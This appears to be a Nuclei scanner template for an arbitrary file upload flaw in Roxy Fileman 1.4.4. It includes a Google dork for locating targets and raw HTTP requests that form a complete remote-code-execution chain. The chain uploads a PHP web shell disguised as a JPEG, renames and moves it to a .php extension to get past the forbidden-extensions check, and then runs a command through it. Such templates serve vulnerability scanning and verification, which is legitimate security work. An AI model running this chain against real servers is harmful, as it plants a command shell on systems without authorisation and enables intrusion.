id: roxyfileman-fileupload
info:
  author: DhiyaneshDK
  description: 'The Roxy File Manager has a configuration setting named FORBIDDEN_UPLOADS,which
    keeps a list of forbidden file extensions that the application will not allow
    to be uploaded. This configuration setting is also checked when renaming an existing
    file to a new file extension.It is possible to bypass this check and rename already
    uploaded files to any extension, using the move function as this function does
    not perform any checks.

    '
  metadata:
    google-dork: intitle:"Roxy file manager"
    verified: 'true'
  name: Roxy Fileman 1.4.4 - Arbitrary File Upload
  reference:
  - https://www.exploit-db.com/exploits/39963
  severity: critical
  tags: intrusive,misconfig,edb,roxy,fileman,rce,fileupload
requests:
- cookie-reuse: true
  matchers:
  - part: body
    regex:
    - namelifyxor
    type: regex
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /php/upload.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6rbEqFAMRkE0RAB7


    ------WebKitFormBoundary6rbEqFAMRkE0RAB7

    Content-Disposition: form-data; name="action"


    upload

    ------WebKitFormBoundary6rbEqFAMRkE0RAB7

    Content-Disposition: form-data; name="method"


    ajax

    ------WebKitFormBoundary6rbEqFAMRkE0RAB7

    Content-Disposition: form-data; name="d"


    /app/Uploads

    ------WebKitFormBoundary6rbEqFAMRkE0RAB7

    Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.jpg"

    Content-Type: image/jpeg


    <?php

    echo exec($_GET["cmd"]);

    ?>


    ------WebKitFormBoundary6rbEqFAMRkE0RAB7--

    '
  - 'POST /php/renamefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest


    f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php

    '
  - 'POST /php/movefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest


    f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php

    '
  - 'GET /Uploads/{{randstr}}.php?cmd=echo+"roxyfileman"+|+rev HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
